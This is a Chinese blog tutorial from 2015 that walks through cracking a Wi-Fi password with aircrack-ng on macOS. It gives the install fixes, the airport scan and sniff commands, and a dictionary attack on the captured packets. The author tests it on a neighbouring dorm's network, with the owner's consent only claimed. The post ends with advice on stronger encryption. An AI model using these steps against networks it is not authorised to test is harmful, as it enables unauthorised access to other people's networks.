---
layout:     post
title:      无线网络攻防初探
date:       2015-10-19 11:40:25
author:     Hsmouc
summary:    使用aircrack－ng工具暴力破解Wi-Fi密码
categories: Hacking
thumbnail:  heart
tags:
 - 欢迎来我的博客
---
- 写在文前：由于相关法律法规本文章不予显示(╯°Д°）╯︵ /(.□ . \)想什么呢…… 好吧，这项技术呢，是不允许的啦，仅供学习，而且千万不要拿隔壁人家的AP做试验喔，黑自己就好了嘛。  

##准备工作  
###原材料
1. 带网卡的计算机
2. 无线路由器 
3. Linux或Mac OS X系统 （什么你是windows？请出门右拐)
4. aircrack-ng （我才不会告诉你们我还有kismet呢）

###安装必备的工具
首先我们进[aircrack](http://www.aircrack-ng.org)的官网。右侧边栏[Installation](http://www.aircrack-ng.org/install.html)选择相应的系统，比如我选择On Mac OS X。然后它说"The simplest and easiest way to install on Mac OS X is via [Macports](https://www.macports.org). You simply do “sudo port install aircrack-ng”."默认大家都过四级了，我就不翻译了。然后我们下载一个Macports，默认大家都会用Mac装dmg。然后装好了，试试它给我的命令：
{% highlight c %}
sudo port install aircrack-ng
{% endhighlight %}
终端里出现了这样的提示
{% highlight c %}
zsh:command not found: port
{% endhighlight %}
好吧，让我们来google一下怎么了。其实这个原因很简单，你装完了Macports，但是终端并不知道你有了新后宫，所以呢更新下路径就解决了。
{% highlight c %}
sudo vi /etc/paths
{% endhighlight %}
增加新的两行：
{% highlight c %}
/opt/local/bin
/opt/local/sbin
{% endhighlight %}
*小贴士：下面装完aircrack-ng的时候还要用这个噢*
好了，让我们再输入一次:
{% highlight c %}
sudo port install aircrack-ng
{% endhighlight %}
然后终端就是这样子的:
![](http://ww1.sinaimg.cn/mw690/005WMcFzjw1ex6rt5bfh7j31400p0grg.jpg)
安装完毕后，输入aircrack-ng --help指令试试。果然还是command not found。用上面搞port问题的方法可以解决。再介绍一个其他方法：  
终端输入：
{% highlight c %}
export PATH=$PATH:/opt/local/bin
{% endhighlight %}
成功了！
##Hacking  
###扫描
在终端里输入指令：
{% highlight c %}
airport en0 scan
{% endhighlight %}
什么？你又报错了？那就对了，那是因为你没有找到airport的路径，也没有把airport加入到sbin下面。解决办法是执行下面的命令：
{% highlight c %}
sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/\Versions/Current/Resources/airport /usr/sbin/airport
{% endhighlight %}
再试一次，这时候我们看到终端上出现了一些wifi的信息。我们选择WEP加密的无线网络，记下它的channel.
###监听
使用命令：
{% highlight c %}
sudo airport en0 sniff 1
{% endhighlight %}
解释一下，我选择的是一个1信道，SSID为429的无线网络。好嘛，这就是隔壁宿舍的宿舍号嘛-_-＃之后会发现网卡进入了监听模式。过了一会，按control＋c来结束监听，这时候会提示你^CSession saved to/tmp/airportSniffxxxxx.cap，监听环节结束。
###跑包
我们首先在终端里输入：
{% highlight c %}
aircrack-ng -w ~/wordlist.txt /tmp/airportSniffxxxxxx.cap
{% endhighlight %}
-w表示使用字典， ~/wordlist.txt是字典的所在路径，/tmp/airportSniffxxxxxx.cap是包所在的位置。
回车以后
![](http://ww2.sinaimg.cn/mw690/005WMcFzjw1ex6rstrn2kj313w0cjq60.jpg)
观察handshake和IVs数值，我们选择handshack的数值为1的429，记下序号为10。在index number of target network里面输入10.
就会出现下图这样类似黑客帝国中炫酷的画面：![](http://ww1.sinaimg.cn/mw690/005WMcFzjw1ex6rswn550j313w0cjjtk.jpg)ps打不开这个截图，我就不打码了，成神别砍我T_T
##总结
一次最简单的Wi-FiHacking就这么完成了，知道你们的Wi-Fi有多不安全了吧。因为是成神的Wi-Fi，确定他不会砍我，所以我甚至没有隐藏我的MAC地址。用aircrack-ng可以做到什么程度呢？WEP/WPA2加密的无线网络，只要有足够长的时间，只要密码本足够全，破解密码只是时间问题。所以说，大家在加密Wi-Fi的时候首先不要用WEP加密，这种加密基本可以秒破。WPA2加密的密码最好保证长度，要有大小写，特殊符号等等，这样可以大大增加黑客解包的难度。被黑客攻下AP可不仅仅是多一个人蹭网的简单后果，严重程度可以参见知乎问题[无线路由器被蹭网后，有被黑的风险吗](http://www.zhihu.com/question/23061570)。  
关于aircrack-ng的其他功能我会继续介绍，我也会继续关注无线网络安全。

<li>对了,我的外置usb无线网卡已经在路上了，我会尝试使用Deauth攻击噢～</li>